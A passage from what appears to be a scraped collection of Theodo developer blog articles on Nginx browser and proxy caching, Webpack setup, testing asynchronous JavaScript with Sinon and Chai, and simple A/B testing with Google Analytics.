same.\n\n\n\nBased on the server\u2019s response (see headers below) the browser will choose to use the cached version or will make a request to download the resource.\nOn the server\u2019s side\n\n\n\nHeader\nMeaning\n\n\n\n\nCache-Control: max-age=3600\nThe resource may be cached for 3600 seconds\n\n\nExpires: Thu, 26 May 2016 00:00:00 GMT\nThe resource must be considered as outdated after this date\n\n\nLast-Modified: Thu, 26 May 2016 00:00:00 GMT\nThe resource was last modified on this date\n\n\nETag: \"56c62238977a31353ce7716e759a7edb\"\nIdentifier for the version of the resource\n\n\n\nThe server can define the cache policy with the Cache-Control header.\nThe max-age directive and the Expires header can both be used to achieve the same goal. The former uses a duration whereas the second one uses a date. That\u2019s how the client knows the expiration date.\nIf the Cache-Control header contains public, the client should not try to revalidate the resource. It will naively use the resource in the cache until the expiration date is reached.\nHowever, if the Cache-Control header contains must-revalidate, then the client should check if the resource is fresh everytime the resource is needed (even if the expiration date has not been reached). This might still be a performance boost in most cases because if the resource has not been modified, the server will return a 304 (not modified), which is arguably very lightweight compared to your original resource.\nLast-Modified and ETag are stored along with the resource so that the client can check later if the resource has changed (when using must-revalidate).\nHow to configure Nginx to enable caching\nLet\u2019s assume that we want to cache the resources that are located in the /static/ folder:\n\n/static/js/ for javascript files\n/static/css/ for CSS files\n/static/images/ for images\n\nFor this purpose, create a dedicated Nginx configuration file: /etc/nginx/conf/cache.conf, responsible for defining the cache policy. In your main configuration file (/etc/nginx/nginx.conf), add:\nserver {\r\n    # ...\r\n\r\n    include conf/cache.conf; # Add this line to your main config to include the cache configuration\r\n}\r\n\nNow, let\u2019s see how the cache configuration can be set! This is an example of /etc/nginx/conf/cache.conf:\n# JS\r\nlocation ~* ^/static/js/$ {\r\n    add_header Cache-Control public; # Indicate that the resource may be cached by public caches like web caches for instance, if set to 'private' the resource may only be cached by client's browser.\r\n\r\n    expires     24h; # Indicate that the resource can be cached for 24 hours\r\n}\r\n\r\n# CSS\r\nlocation ~* ^/static/css/$ {\r\n    add_header Cache-Control public;\r\n\r\n    # Equivalent to above:\r\n    expires     86400; # Indicate that the resource can be cached for 86400 seconds (24 hours)\r\n\r\n    etag on; # Add an ETag header with an identifier that can be stored by the client\r\n}\r\n\r\n# Images\r\nlocation ~* ^/static/images/$ {\r\n    add_header Cache-Control must-revalidate; # Indicate that the resource must be revalidated at each access\r\n\r\n    etag on;\r\n}\r\n\nIt is not aimed at a production use, it is merely an excuse to show the different ways cache can be configured.\nNote:\n\nA negative value for expires automatically sends a Cache-Control: no-cache in the response, thus deactivating the cache.\nThere is no need to manually add a Last-Modified header in the config as Nginx automatically sets it with the last modification date of the resource on the file system.\n\nReminders:\n\nThe Last-Modified date and the ETag identifier are stored by the client to avoid requests in the future.\nThe client may or may not check the freshness of the resource (with If-Modified-Since or If-None-Match), depending on the directives in Cache-Control.\n\nConclusion\nWhich strategy you should use is up to you: it is a tradeoff between the size of the resource, how often it changes and how important it is for your users to see the changes immediately.\nFor example, if you have a logo (and logos do not usually change very often!), it makes sense to cache it and to not try to revalidate it for 7 days.\nFor critical resources, you might want to revalidate every time. The most important use case is arguably the security update: if you patch your javascript code to fix a vulnerability, you want the user to get it as soon as possible, and you don\u2019t want them to use a harmful version in their browser cache.\nFinally, there are some cases where you might want to tell the browser not to cache the resource: if it contains sensitive information or if you know that the resource changes too often to hope gain something from caching.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Trinquier\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a full stack developer. Along with his fellows at Theodo, he builds, with pragmatism, tomorrow's applications.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAs a front-end Javascript developer, managing your source files can quickly get tricky. On the back-end side, Node has a built-in module resolver \u2014require\u2014 whereas there is no built-in module resolver in the browsers.\nIn this article, I will get you started with Webpack, a very powerful tool to organize, compile and package your source files. Webpack is an module bundler that will let you compile, optimize and minify all your files: Javascript, CSS, pictures, etc.\nYou might have heard about Gulp as another module bundler. Compared to Webpack, Gulp can be seen as a scripting platform, that will let you chain different building tasks. Webpack is an all-in-one solution, capable of handling all your source files. Moreover, Webpack offers some very powerful features that will make your developments faster:\n\na module resolver for your front end source code\na hot reloader, that will replace any modified part of your code directly in the browser when you save the source file, without any page refresh.\n\nInstead of presenting a Webpack boilerplate or starter kit, I will show you how to build a web application step by step from scratch, so that you will end up with a fully working solution that you are comfortable coding with.\nLet\u2019s get started!\nBasic project structure\nFirst of all, we need to organize our project\u2019s folders. Here is a common directory structure that has proven its worth for many people:\n.\r\n\u251c\u2500\u2500 src                           // The main source folder, where all our source files will go (Webpack's input)\r\n|   \u2514\u2500\u2500 your-first-js-file.js\r\n\u251c\u2500\u2500 dist                          // Built files folder (Webpack's output)\r\n\u251c\u2500\u2500 package.json\r\n\u2514\u2500\u2500 webpack.config.js             // Webpack config file\r\n\nWe will go into more detail regarding each file later in the article.\nPackage installation\nIn order to use Webpack, we first need to fetch the corresponding module. We\u2019ll assume you\u2019re running Node v4+.\nAll commands will be run from your project\u2019s root folder. If you don\u2019t have a package.json in your project already, then run npm init.\nNow let\u2019s install Webpack:\nnpm install --save webpack\r\n\nMinimum configuration\nNow that we have Webpack installed, let\u2019s configure it. This is done with a plain JS file, webpack.config.js.\nThe bare minimum to make Webpack compile our sources is to provide it with an entry point as well as an output.\nvar config = {\r\n    entry: './src',               // entry point\r\n    output: {                     // output folder\r\n        path: './dist',           // folder path\r\n        filename: 'my-app.js'     // file name\r\n    }\r\n}\r\nmodule.exports = config;\r\n\nWe will now add an npm script to the package.json to call Webpack compilation:\n// package.json\r\n\r\n// ...\r\n\r\n\"scripts\": {\r\n    \"build\": \"webpack\"\r\n}\r\n\r\n// ...\r\n\nNow, when running npm run build, Webpack will look the webpack.config.js up and compile our application.\nAs you set in the config, our application\u2019s entry point is ./src. We therefore need to define this entry point:\n// src/index.js\r\nconsole.log('Hello Webpack!');\r\n\nNow that we have our entry point, let\u2019s build the application!\nnpm run build\r\n\nAs a result, Webpack will bundle up our src/index.js into dist/my-app.js. If you look at the produced file, you\u2019ll notice that Webpack has added some code of its own. That is the module resolver. This provides a require function, exactly as in a NodeJS script!\nAdd an index.html to our project, so that we can see the effects of the JS files.\n<!-- index.html -->\r\n<html>\r\n    <head>\r\n        <script type=\"text/javascript\" src=\"./dist/my-app.js\"></script>\r\n    </head>\r\n    <body>\r\n    </body>\r\n</html>\r\n\nManually open this file with your favorite web browser, and see the Hello Webpack! in the console.\nModularity\nLet\u2019s recap what we have done so far. We have configured Webpack to bundle the entry point \u2013src/index.js\u2013 into an output bundle \u2013dist/my-app.js-. We then created an index.html that calls the bundle. This way, all the code inside src/index.js is executed in the browser when we manually open the index in a browser.\nThe next step is to separate our code into multiple files.\nTo build our source files, Webpack will start by compiling the entry point provided in the configuration file. It will then move from require to require (or import in ES6), and include every \u2019required\u2019 file in the build pipe.\nLet\u2019s see how to include other files to the bundled output:\n// src/greet.js\r\nfunction greet(who) {\r\n    console.log('Hello ' + who + '!');\r\n};\r\n\r\nmodule.exports = greet;       // Exposes the greet function to a require in another file\r\n\n// src/index.js\r\nvar greet = require('./greet');   // Import the greet function\r\n\r\ngreet('Webpack');\r\n\nAs you see, we can require local files by providing a relative path. Notice that we don\u2019t need to specify the file extension, since it\u2019s a JS file. Webpack can manage a bunch of default extensions to know which file it will look for.\nAnother important thing to notice is that you might eventually end up with very long relative paths when your application grows. For example, it is quite common to depend on a file located in a different folder, and you will find yourself writing imports such as require('../../../../components/home/dashboard/title').\nTo avoid such messy paths, it is possible to tell Webpack which folder it can consider as the application\u2019s root folder. In our case, src is the root folder:\n// webpack.config.js\r\n\r\nvar path = require('path');\r\nvar SRC = path.join(__dirname, 'src/');\r\nvar NODE_MODULES = path.join(__dirname, 'node_modules/');\r\n\r\n// ...\r\n  resolve: {\r\n    root: [SRC, NODE_MODULES],                  // root folders for Webpack resolving, so we can now call require('greet')\r\n    alias: {\r\n      'actions': path.join(SRC, 'actions/'),    // sample alias, calling require('actions/file') will resolve to ./src/actions/file.js\r\n      // ...\r\n    }   \r\n  },\r\n// ...\r\n\nWith the ability to use modules, we now have very clean code organization. This is because it has been split into several files and folders, depending on what your application is.\nMoreover, we can manage our dependencies just as we would do in a Node application. Therefore, we can import external libraries by calling require('library-name').\nThis will ask Webpack to resolve the module library-name, by looking into the node_modules folder (Webpack will look into other default folders too, see there).\nLet\u2019s modify our greet function to use an external library:\n// src/greet.js\r\nvar moment = require('moment'); // Add momentjs\r\n\r\nfunction greet(who) {\r\n    console.log('Hello ' + who + ', it\\'s ' + moment().format('h:mm:ss a') + '!');\r\n};\r\n\r\nmodule.exports = greet;\r\n\nCompilation\nSo far we have our source files bundled up into a single output file, which is read by the index.html.\nThat\u2019s a good starting point for building our web application, but unless we want to write it in plain old ES5 Javascript, we need to actually transform the files while they are bundled together.\nLet\u2019s say for instance we want to use the new Javascript specifications, EcmaScript2015 and EcmaScript2016.\nSince we are building an application for the web, we need to maximize the browser compatibility of our code. Therefore, we need to transpile any ES6/ES7 code to ES5, which is supported by all modern browsers (do not hesitate to use the excellent caniuse website to check any browser-related compatibility questions).\nWe will use Babel to transpile ES6 and ES7.\nLet\u2019s install Babel and its presets for ES6 and ES7:\nnpm install --save-dev babel babel-preset-es2015 babel-preset-stage-0\r\n\nWe need to configure it to use these presets:\n// package.json\r\n\r\n// ...\r\n    \"babel\": {\r\n        \"presets\": [\r\n            \"es2015\",      // ES6 compilation ability\r\n            \"stage-0\"      // ES7 compilation ability\r\n        ]\r\n    },\r\n// ...\r\n\nBabel is now configured to transpile JS files, but it\u2019s still not working together with Webpack.\nLet me introduce the concept of Webpack loaders. Loaders are used by Webpack in order to handle a given file type.\nEverytime Webpack reads a require() or an import, it will handle the content of the required file with a loader.\nBy default, Webpack comes with a built in JS handler, which tells it how to handle plain JS files and bundle them up. In order to handle different file types, or simply deal with JS files in a different manner, we must specify a loader configuration to Webpack.\nAs you might have guessed, the link between Webpack and Babel will be made by a loader.\nIt\u2019s called\u2026 babel-loader!\nFirst we need to download it:\nnpm install --save-dev babel-loader\r\n\nNow that we have it as a dependency, we must tell Webpack where to use it.\n// webpack.config.js\r\nvar config = {\r\n    entry: './src',\r\n    output: {\r\n        path: './dist',\r\n        filename: 'my-app.js'\r\n    },\r\n    module: {\r\n      loaders: [\r\n        {\r\n          test: /\\.js$/,\r\n          loaders: ['babel']      // note that specifying 'babel' or 'babel-loader' is equivalent for Webpack\r\n        }\r\n      ]\r\n    }\r\n}\r\nmodule.exports = config;\r\n\nThis will add a new loader to Webpack.\nEvery time Webpack sees a require('xxx.yy'), it will loop through all its configured loaders and check if xxx.yy matches the provided test regexp (in our case, /\\.js$/).\nAs you can infer now, the babel-loader will be used to compile every .js file. We can therefore rewrite our good old ES5 files into ES6/ES7 files!\nManaging other file types\nNow that we are clear on the loader concept, we can manage other file types. In this article, I\u2019ll show you how to handle some common file types, such as fonts and CSS files; however, keep in mind that there are a LOT of loaders on npmjs for almost any file type.\nStyle files\nPlain CSS files\nThere are two loaders for .css files, called style-loader and css-loader.\nYou can try to figure out by yourself how to add these loaders in order to handle .css files.\nHere is a suggestion of configuration:\n// webpack.config.js\r\n\r\n// ...\r\n  {\r\n    test: /\\.css$/,\r\n    loaders: ['style', 'css'] // Note that the order is important here, it means that 'style-loader' will be applied to the ouput of 'css-loader'\r\n  },\r\n// ...\r\n\r\n\nNOTE: the CSS will be added to the bundled file; in our case, my-app.js. The style will be loaded in your browser, but you might be used to having separate .css files. If you want Webpack to output separate style files, please use ExtractTextWebpackPlugin.\nSASS/Less/PostCSS\nIn case you are using SASS, Less or PostCSS, simply add the corresponding loader:\n\nsass-loader\nless-loader\npostcss-loader\n\nFont files\nIf you use specific fonts in your project, Webpack can handle them too!\nSince the fonts will be downloaded as such by your client application, use the file-loader:\n// webpack.config.js\r\n\r\n// ...\r\n    {\r\n      test: /\\.(eot|svg|ttf|woff|woff2)$/,\r\n      loader: 'file?name=public/fonts/[name].[ext]'\r\n    }\r\n// ...\r\n\nThis will output all font files to the public/fonts folder.\nImages\nSimilarly to fonts, images are usually served directly by web servers and loaded on demand by the client. The loader configuration is very similar:\n// webpack.config.js\r\n\r\n// ...\r\n    {\r\n      test: /\\.(jpg|png|svg)$/,\r\n      loader: 'file?name=public/images/[name].[ext]'\r\n    }\r\n// ...\r\n\nOther files\nWe could continue the list of all possible files Webpack loaders can handle, but this is not the aim here. If you want to load other file types, search for \u2018yourFiletype loader\u2019 on the Internet, and you will find the corresponding loader. For example, load .jade files with the jade loader, .cs files with the coffee loader, etc.\nGoing further\nThese are the basic usages of Webpack. You might now want to move to more advanced topics about Webpack.\nHere is a non exhaustive list of subject you might want to read about:\n\nOptimising your bundles by partially serving them, and more\nWebpack dev server and the hot modules reloader\n\nIn the meantime, do not hesitate to read the official documentation to discover new features and grab a deep understanding of Webpack\u2019s multiple options.\nUpdate 05/02/17\nI had initially planned to write this article in two parts, putting the more advanced topics in the second parts.\nUnfortunately, I could not make it to write the second part, so I added two links to great articles dealing with these topics.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tStanislas Bernard\r\n  \t\t\t\r\n  \t\t\t\tAgile web developer at Theodo, Javascript lover.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIn the previous article we discovered how to write simple unit tests thanks to the Mocha-Sinon-Chai stack. Let\u2019s now continue with this stack and focus on a problem we will necessarily be confronted to if we use JavaScript: testing asynchronous code.\nA full working example of the code snippets shown below can be found in this repository: https://github.com/tib-tib/demo-js-tests-part-2.\u00a0There are several ways to do asynchronous JavaScript. I focused on callbacks and promises.\nHow to test an asynchronous function with callback?\nTo begin with, let\u2019s take a simple example of a function retrieving a list of superheroes:\nvar SuperheroModel = require('./SuperheroModel');\r\nvar logger = require('./logger');\r\n\r\nmodule.exports = {\r\n  getSuperheroesList: function (callback) {\r\n    SuperheroModel.find(function (error, superheroes) {\r\n      if(error) {\r\n        logger.error(error);\r\n      }\r\n      return callback(error, superheroes);\r\n    });\r\n  }\r\n};\r\n\nHere, we have an asynchronous call to a find method of a superhero model.\nWe want to test two things:\n\nif there is an error, check that it is logged and returned.\nif all went well, check that the getSuperheroesList function returns the superheroes list.\n\nTo achieve this, we need to create a stub of our find method.\u00a0However, we cannot use the returns function of the stub as we do usually, because the find method here returns its results via its callback.\nIn fact, we have to tell the stub to call the callback function with the specific values we want.\u00a0To do so, Sinon provides us a callsArgWith function.\u00a0This function takes as parameters the argument index to which we will pass values, and the values to pass.\nLet\u2019s see how it goes:\nvar sinon = require('sinon');\r\nvar sinonChai = require('sinon-chai');\r\nvar chai = require('chai');\r\nvar should = chai.should();\r\nchai.use(sinonChai);\r\n\r\nvar superheroService = require('./superheroService');\r\nvar SuperheroModel = require('./SuperheroModel');\r\nvar logger = require('./logger');\r\n\r\nvar sandbox;\r\nvar findStub;\r\n\r\ndescribe('superheroService', function() {\r\n  beforeEach(function() {\r\n    sandbox = sinon.sandbox.create();\r\n    findStub = sandbox.stub(SuperheroModel, 'find');\r\n    sandbox.stub(logger, 'error');\r\n  });\r\n\r\n  afterEach(function() {\r\n    sandbox.restore();\r\n  });\r\n\r\n  it('should return a list of superheroes', function() {\r\n    var superheroesList = ['Batman', 'Superman', 'Iron Man'];\r\n    findStub.callsArgWith(0, null, superheroesList);\r\n\r\n    superheroService.getSuperheroesList(function (error, result) {\r\n      should.not.exist(error);\r\n      result.should.deep.equal(superheroesList);\r\n    });\r\n  });\r\n\r\n  it('should log and return an error', function() {\r\n    findStub.callsArgWith(0, 'A_BIG_ERROR');\r\n\r\n    superheroService.getSuperheroesList(function (error, result) {\r\n      error.should.equal('A_BIG_ERROR');\r\n      should.not.exist(result);\r\n      logger.error.should.have.been.calledWithExactly('A_BIG_ERROR');\r\n    });\r\n  });\r\n})\r\n\r\n\nThereby, in the first test we specify with a findStub that the callback of the find method has to be called with no error and a fake superheroes list, whereas in the second one we tell to call it with an error.\nYou can notice the presence of sinon-chai, that extends Chai with custom assertions such as calledWithExactly.\nWe also used a sandbox in the beforeEach and afterEach functions.\nIt allows us to restore all the stubs defined between each test of the suite.\nNow let\u2019s take a look at the same example with a promise.\nHow to test an asynchronous function with promise?\nNow assume the getSuperheroesList function looks like this:\nvar SuperheroModel = require('./SuperheroModel');\r\nvar logger = require('./logger');\r\n\r\nmodule.exports = {\r\n  getSuperheroesList: function () {\r\n    return SuperheroModel.find()\r\n    .then(function (superheroes) {\r\n      return superheroes;\r\n    })\r\n    .catch(function (error) {\r\n      logger.error(error);\r\n      throw error;\r\n    });\r\n  }\r\n};\r\n\r\n\nIn the same way as above, we want to test the two situations (when the promise is resolved and when it is rejected):\nvar sinon = require('sinon');\r\nvar sinonChai = require('sinon-chai');\r\nvar chai = require('chai');\r\nvar should = chai.should();\r\nchai.use(sinonChai);\r\n\r\nvar superheroService = require('./superheroService');\r\nvar SuperheroModel = require('./SuperheroModel');\r\nvar logger = require('./logger');\r\n\r\nvar sandbox;\r\nvar findStub;\r\n\r\ndescribe('superheroService', function() {\r\n  beforeEach(function() {\r\n    sandbox = sinon.sandbox.create();\r\n    findStub = sandbox.stub(SuperheroModel, 'find');\r\n    sandbox.stub(logger, 'error');\r\n  });\r\n\r\n  afterEach(function() {\r\n    sandbox.restore();\r\n  });\r\n\r\n  it('should return a list of superheroes', function() {\r\n    var superheroesList = ['Batman', 'Superman', 'Iron Man'];\r\n    findStub.returns(new Promise(function(resolve) {\r\n      resolve(superheroesList);\r\n    }));\r\n\r\n    return superheroService.getSuperheroesList()\r\n    .then(function(result) {\r\n      result.should.deep.equal(superheroesList);\r\n    });\r\n\r\n  });\r\n\r\n  it('should log and return an error', function() {\r\n    findStub.returns(new Promise(function(resolve, reject) {\r\n      reject('A_BIG_ERROR');\r\n    }));\r\n\r\n    return superheroService.getSuperheroesList()\r\n    .catch(function(error) {\r\n      error.should.equal('A_BIG_ERROR');\r\n      logger.error.should.have.been.calledWithExactly('A_BIG_ERROR');\r\n    });\r\n  });\r\n})\r\n\nThe findStub now returns in the first test a resolved promise and in the second one a rejected promise.\nYou can simplify your promises tests by using the Chai as Promised library. It allows you to use directly assertions on your promises instead of writing the promise handlers manually. You can see the same example as above with this library in my repository.\nNow that you know the basics about asynchronous testing in JavaScript, you have no more excuses to not unit testing your code!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tThibaut Gatouillat\r\n  \t\t\t\r\n  \t\t\t\tAgile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWeb Cache?\nA few days ago, Nicolas Trinquier wrote a cool article about how to improve your webapp performances using browser cache with Nginx.\nReading it will teach you that browsers can store content received from the server in order to avoid downloading it again.\nYou can actually use cache at different levels of your application\u2019s infrastructure.\nA web cache stands between your users\u2019 browsers and your server. It caches server responses in its memory so that if another client asks for it again, the request will not go to the server but will be served by the web cache immediately. This can save the server from having to execute its most intensive tasks.\nNginx?\nUsually, Nginx is used as a reverse proxy/load balancer for apps.\nAs it stands between client and server to check all of your user\u2019s requests, it\u2019s perfectly shaped to serve as a web cache!\nLooks great! How?\nTo use Nginx as a web cache, we need to use some of its directives:\nproxy_cache_path:\nHere we will define the path where nginx will store cached content and the memory you want to allow for it.\nThere are two mandatory parameters, path and keys_zone:\n\npath defines the path where nginx is going to store cached content, basically you should store this in something like /data/nginx/cache.The content to be cached is actually written to a temporary directory that you can chose by setting the use_temp_path option which is the general proxy_temp_path you set for Nginx by default.\nkeys_zone allows you to define the zone where the keys leading to these contents will be stored, name it as you wish and define the size you need (we speak of the keys, according to documentation, 1MB is about 8000 keys).\n\nA word about the inactive parameter: it actually lets Nginx remove files that have not been requested during the specified duration from the cache. If not explicitly set this duration will be 10mins. This means Nginx\u2019s cache will get rid of unused content to leave space for the most requested one \u2013 exactly what we are looking for, isn\u2019t it?\nproxy_cache:\nThis directive stands in a location block and allows you to link it with the keys_zone of your choice (references the keys_zone parameter of the proxy_cache_path directive).\nA simple working example where we also added a header to all of our requests called \u2018Web-Cache-Status\u2019 that will be set by nginx to \u2018Hit\u2019 if the content comes from the cache or \u2018Miss\u2019 if it doesn\u2019t:\nproxy_cache_path /data/nginx/cache keys_zone=my_zone:10m inactive=60m;\r\n\r\nserver {\r\n    listen 80 default_server;\r\n    root /var/www/;\r\n    index index.html index.htm;\r\n\r\n    server_name example.com www.example.com;\r\n\r\n    charset utf-8;\r\n\r\n    location / {\r\n        proxy_cache my_zone;\r\n        add_header Web-Cache-Status $upstream_cache_status;\r\n\r\n        include proxy_params;\r\n        proxy_pass urlOfProxiedServer\r\n    }\r\n}\r\n\nGoing a little bit further\nStale can still be good!\nYou can allow Nginx to keep serving stale content if it hasn\u2019t been modified on the server side. Whenever it finds stale content, Nginx will check the last date it was modified before trying to download it.\nTo do so, add proxy_cache_revalidate: on; to the \u2018server\u2019 section of your conf.\nOnce for all\nIf multiple users request content at the same time, Nginx will download the content from the server each time until it has it in the cache.\nYou can actually tell Nginx to download the content only once and to wait for it to be downloaded before serving it to all the users.\nJust add proxy_cache_lock: on; to the correct \u2018location\u2019 section of your conf!\nBypassing web cache\nMost of the time, you need to cache stuff on your client\u2019s browser AND use a web cache.\nIf your browser asks for content that just expired from its cache, your web cache might just send it back without asking to the server for the freshest version.\nDon\u2019t worry, Nginx lets you set conditions in which your requests will bypass the web cache \n\nproxy_cache_bypass:\nLets you set the conditions in which the content will not be TAKEN FROM the web cache.\nproxy_no_cache:\nLets you set the conditions in which the content will not be STORED TO the web cache.\n\nFor example:\nlocation / {\r\n    proxy_cache_bypass $cookie_nocache $arg_nocache;\r\n}\r\n\nHere we\u2019re asking Nginx to go straight to the fresh content for requests showing a no cache cookie or argument.\nReplace proxy_cache_bypass with proxy_no_cachein order to prevent Nginx from even storing the content in the response.\nStale is better than nothing\nYou can set nginx to deliver stale content if it is not able to get fresh one from the server.\nThat will prevent your website from showing server errors to users.\nFollowing is a small working example, using the proxy_cache_use_stale directive, allowing nginx to show stale content in case it gets a timeout or a 5XX error from your server!\nlocation / {\r\n    proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;\r\n}\r\n\nHere we also add an optional parameter called updating!\nDoing so will let Nginx deliver stale content while it is downloading a fresh version of the file from your server!\nConclusion\nThese few steps help you speed up your web app really easily and are, in my humble opinion, not yet automatic among developers!\nDon\u2019t forget it next time you\u2019re working on a project that\u2019s likely to get big!\nYou can think of various solutions for your web caching, like using Varnish for instance, but it seems to me that Nginx really is one of the best candidates for you!\nIt is indeed very easy to configure, pretty efficient and can still handle all its other functions, like being a web server, while managing the web cache in a great way!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Sra\u00efki\r\n  \t\t\t\r\n  \t\t\t\tMaxime is a web developer enthralled by value creation and web development. Surrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHave you ever met a coworker or client which is persuaded that you should do this way while you think it\u2019d be better that way?\nInstead of infinite debate what you need is facts!\nLet\u2019s Not Make a Choice!\n\nThe choice is not yours, it belongs to your users.\nThe aim of A/B testing (or split testing) is to scientifically prove that a solution A is better than another solution B to achieve a measurable goal.\nYou compare the two solutions by randomly offering one of the two solutions and then measure the effectiveness of each.\nYou\u2019ll need a goal, a metric and several solutions to test.\nWe Want You To Join Us\nSuper Simple Example\nAt Theodo we want people to join us.\nGoal: get visitors on the join us page\nAnd by chance we love to write articles! One way to achieve our goal is to convert the readers in appliers.\nMetric: Conversion rate readers -> appliers\nExcept some people want a button while others prefer a link.\nA/B Solutions: button/link\nLet\u2019s Do This!\nWhat you shouldn\u2019t do\nAlright, let\u2019s put a button for a couple weeks and then change to put a link.\nAfter your experiment you see that you had 10 clicks during the two first weeks and 20 in the two last. The link seems better!\nBut wait, on the third week our CEO was invited on a TV show. This introduced a huge bias.\nThe experiment shall not be time dependent. Hence to avoid any bias we include randomness.\nLet\u2019s code this right\nTo A/B test you don\u2019t need much.\nThe core piece of code is this:\nvar ABTest = Math.random() >= 0.5;\r\n\nIf you add some logic:\nvar ABDivInnerHtml\r\nvar myUrl = myUrl\r\nvar ABTest = Math.random() >= 0.5;\r\nif (ABTest) {\r\n  ABDivInnerHtml = \"<button onclick=\\\"location.href='\" + myUrl + \"';\\\"> Join Us </button>\";\r\n} else {\r\n  ABDivInnerHtml = \"<a href=\\\"\" + myUrl + \"\\\"> Join Us </a>\"\r\n};\r\ndocument.getElementById(\"ABDiv\").innerHTML = ABDivInnerHtml;\r\n\n<div id=\"ABDiv\"></div>\r\n\nIs that all?\nWell you\u2019ll need a little more. How do we measure?\nA super easy solution is Google Analytics. It lets you do a LOT of stuff I won\u2019t talk about in this article except visitor counting and event monitoring.\n\n\ncreate an account on Google Analytics so you have a Tracking ID.\n\n\ninclude this script in your header:\n\n\n  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){\r\n  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\r\n  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\r\n  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');\r\n\r\n  var trackId = YourTrackingId\r\n  ga('create', trackId, 'auto');\r\n  ga('send', 'pageview');\r\n\nthe last line tracks the viewers of your page.\n\nto watch an event call this function:\n\nga('send', 'event', [eventCategory], [eventAction], [eventLabel])\r\n\nfor exemple if we want to track the clicks on the button for the JoinUs page:\nga('send', 'event', 'button', 'click', 'Join Us')\r\n\n\nAnalyse your results here\nIn our case, with a conversion rate of 1% and a Minimum detectable effect of 25%, the result gets significative once you\u2019ve reached 25000 visitors. If you want to dig in A/B test statistics see this page to compute your significative sample size.\n\nEt Voila !\nYour file should look like this:\n<!DOCTYPE html>\r\n<html>\r\n  <head>\r\n    <script>\r\n      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){\r\n      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\r\n      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\r\n      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');\r\n\r\n      var trackId = YourTrackingId\r\n      ga('create', trackId, 'auto');\r\n      ga('send', 'pageview');\r\n    </script>\r\n  </head>\r\n  <body>\r\n\r\n    <div id=\"ABDiv\"></div>\r\n\r\n    <script>\r\n      var ABDivInnerHtml\r\n      var yourUrl = \"http://www.theodo.fr/en/joinus/developer\"\r\n      var ABTest = Math.random() >= 0.5;\r\n      if (ABTest) {\r\n        ABDivInnerHtml = \"<button onclick=\\\"location.href='\" + yourUrl + \"'; ga('send', 'event', 'button', 'click', 'Join Us');\\\"> Join Us </button>\";\r\n      } else {\r\n        ABDivInnerHtml = \"<a onclick=\\\"ga('send', 'event', 'link', 'click', 'Join Us');\\\" href=\\\"\" + yourUrl + \"\\\"> Join Us </a>\";\r\n      };\r\n      document.getElementById(\"ABDiv\").innerHTML = ABDivInnerHtml;\r\n    </script>\r\n\r\n  </body>\r\n</html>\r\n\nThis piece of code helped us to decide wether the button or a link at the end of a paragraph was more efficient (the button won with twice more clicks than the link).\nA/B testing can be really quick to implement. It can be used in a lot of cases such as wording, images, interfaces, etc.\nGet your client to give it a shot, to support your ideas or to back up his theories with actual data.\nNow you can click on the button \ud83d\ude09\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSammy Teillet\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
